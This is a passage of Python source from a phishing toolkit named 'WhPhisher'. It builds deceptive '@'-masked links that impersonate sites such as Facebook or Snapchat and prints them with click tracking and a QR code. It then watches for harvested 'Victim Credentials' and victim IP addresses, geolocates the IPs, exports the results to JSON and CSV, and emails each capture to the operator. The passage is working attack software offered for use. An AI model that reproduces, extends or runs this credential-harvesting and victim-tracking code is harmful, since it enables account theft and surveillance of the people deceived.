    if not main2.find("gd")!=-1:
        sprint(error+"Service not available :c")
        waiter()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Enter the domain (Example: facebook.com, snapchat.com > ")
    if domain=="":
        sprint("\n"+error+"What??")
        bait= input("\n"+ask+"Enter words describing the link, using - as space (Example: sign-in, account-danger) > ")
        if (bait==""):
            sprint("\n"+error+"I didn't understand :c!")
            sprint("\n"+success+"Your link is > https://"+ main)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Badly written!")
            waiter()
        final= "https://"+bait+"@"+main
        sprint("\n"+success+"Your link is > "+ final)
        waiter()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Enter words describing the link, using - as space (Example: sign-in, account-danger) > ")
        if (bait==""):
            sprint("\n"+error+"I didn't understand :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Your link is > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"I didn't understand :c!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your link is > "+ final)
        waiter()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Enter words describing the link, using - as space (Example: sign-in, account-danger) > ")
        if bait=="":
            sprint("\n"+error+"I didn't understand :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Your link is > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"I didn't understand!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your link is > "+ final)
        waiter()

# Output urls
def url_manager(url,num1,num2):
    internet()
    sprint("\n"+success+"Your links have been generated :D: \n")
    system("rm -rf $HOME/.site/ip.txt")
    print(info2+"URL "+num1+" > "+bwhite+url)
    if os.path.isfile(root+"/.site/.info.txt"):
        with open(root+"/.site/.info.txt", "r") as inform:
            masked=inform.read()
            print(info2+"URL "+num2+" > "+bwhite+masked.strip()+"@"+url.replace("https://",""))
    
    # Track session
    session_id = track_click(url)
    
    # Generate QR Code if enabled
    if config['qr_code']:
        sprint("\n"+info2+"QR Code for easy mobile access:")
        generate_qr_ascii(url)
        sprint("")
    
    # Save URL to analytics file
    analytics_data = {
        'timestamp': datetime.now().isoformat(),
        'url': url,
        'session_id': session_id,
        'clicks': 0
    }
    if config['auto_export']:
        export_to_json(analytics_data, 'url_analytics.json')


# Last function capturing credentials
def waiter():
    sprint("\n"+info+bpurple+"Waiting for login...." +bcyan+ " Press "+bred+ "Ctrl+C" +bcyan+" to exit :D")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print("\n\n"+success+bgreen+f"Victim Credentials found! [{timestamp}]\n\007")
                with open(root+"/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    j=0
                    o=len(userdata)
                    credential_text = ""
                    while j<o:
                        print(bcyan+'['+bgreen+'*'+bcyan+'] '+byellow+userdata[j],end="")
                        credential_text += userdata[j]
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                
                # Export to JSON/CSV
                if config['auto_export']:
                    export_data = {
                        'timestamp': timestamp,
                        'type': 'credentials',
                        'data': credential_text.strip(),
                        'ip': 'pending',
                        'country': 'pending',
                        'city': 'pending',
                        'session_id': generate_session_id()
                    }
                    export_to_json(export_data, 'capture_data.json')
                    export_to_csv(export_data, 'capture_data.csv')
                    sprint(info2+"Data exported to JSON and CSV")
                
                # Send email notification
                if config['email_enabled']:
                    email_body = f"Credentials captured at {timestamp}:\n\n{credential_text}"
                    send_email_notification("WhPhisher - Credentials Captured", email_body)
                
                print("\n"+info+bblue+"Waiting for next....."+bcyan+ "Press "+bred+ "Ctrl+C" +bcyan+ " to exit :D")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(logo)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print("\n\n"+success+bgreen+f"Victim IP found! [{timestamp}]\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    ip_address = ""
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        ip_address += ipdata[h].strip()
                        h+=1
                
                # Get geolocation
                geo_info = {}
                if config['geolocation'] and ip_address:
                    sprint("\n"+info2+"Fetching geolocation data...")
                    geo_info = get_geolocation(ip_address)
                    if geo_info:
                        print(f"{info2}Location: {geo_info.get('city', 'Unknown')}, {geo_info.get('region', 'Unknown')}, {geo_info.get('country', 'Unknown')}")
                        print(f"{info2}ISP: {geo_info.get('isp', 'Unknown')}")
                        print(f"{info2}Coordinates: {geo_info.get('lat', 0)}, {geo_info.get('lon', 0)}")
                
                print("\n"+info+"Saved in ip.txt")
                
                # Export to JSON/CSV with geolocation
                if config['auto_export']:
                    export_data = {
                        'timestamp': timestamp,
                        'type': 'ip',
                        'data': ip_address,
                        'ip': ip_address,
                        'country': geo_info.get('country', 'Unknown'),
                        'city': geo_info.get('city', 'Unknown'),
                        'session_id': generate_session_id()
                    }
                    export_to_json(export_data, 'capture_data.json')
                    export_to_csv(export_data, 'capture_data.csv')
                    sprint(info2+"Data exported to JSON and CSV with geolocation")
                
                # Send email notification
                if config['email_enabled']:
                    geo_text = ""
                    if geo_info:
                        geo_text = f"\n\nLocation: {geo_info.get('city')}, {geo_info.get('country')}\nISP: {geo_info.get('isp')}"
                    email_body = f"IP captured at {timestamp}:\n\n{ip_address}{geo_text}"
                    send_email_notification("WhPhisher - IP Captured", email_body)
                
                print("\n"+info+blue+"Waiting for more information "+cyan+ "Press "+red+ "Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        os.system("stty -echoctl")
        update()
        main()
    except KeyboardInterrupt:
        pexit()
